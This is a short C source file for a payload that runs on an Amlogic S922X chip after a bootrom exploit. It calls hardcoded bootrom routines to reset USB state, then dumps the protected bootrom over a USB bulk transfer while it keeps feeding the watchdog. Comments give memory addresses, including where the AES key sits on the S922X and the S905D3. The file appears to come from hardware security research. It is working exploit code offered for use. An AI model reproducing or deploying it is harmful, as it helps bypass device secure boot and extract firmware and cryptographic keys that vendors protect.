/*
 * memdump_over_usb.c - S922X memory dump tool over USB
 */
#define P_WATCHDOG_RESET (volatile unsigned int *)0xFFD0F0DC
#define _clear_icache() ((void (*)(void))0xffff0534)()   //previously 0xffff048c for S905D3
#define _dwc_pcd_irq() ((void (*)(void))0xffff6d7c)()    //previously 0xffff8250 for S905D3
#define _start_bulk_transfer(pcd) ((void (*)(volatile pcd_struct_t *))0xffff56ec)(pcd)  //previously 0xffff6b58 for S905D3
#define BOOTROM_ADDR 0xFFFF0000                 //bootrom 0xFFFF0000, AES key 0xFFFE7C20 (AES key for S905D3 0xFFFE0020)

typedef struct pcd_struct_s
{
    unsigned int d32[2];
    int ep0state;
    char *buf;
    int length;
    char *bulk_buf;
    int bulk_len;
    int bulk_num;
    int bulk_data_len;
    int xfer_len;
    char bulk_out;
    char bulk_lock;
    unsigned request_config : 1;
    unsigned request_enable : 1;
} pcd_struct_t;

static inline void usb_setup_bulk_in(unsigned char *buf, unsigned int len)
{
    volatile pcd_struct_t *pcd = (pcd_struct_t *)0xfffe3928;
    pcd->bulk_out = 0; // BULK IN
    pcd->bulk_buf = buf;
    pcd->bulk_data_len = len;
    pcd->bulk_len = 0x200;

    _start_bulk_transfer(pcd);
}

static inline void watchdog_reset(void)
{
    *P_WATCHDOG_RESET = 0;
}

void _start()
{
    _clear_icache(); //always first instruction
    _dwc_pcd_irq();  //clear USB state
    _dwc_pcd_irq();  //after exploitation

    usb_setup_bulk_in((unsigned char *)BOOTROM_ADDR, 0x10000);  //0x10000 bytes for BootRom
    do
    {
        watchdog_reset();
        _dwc_pcd_irq();
    } while (1);
}
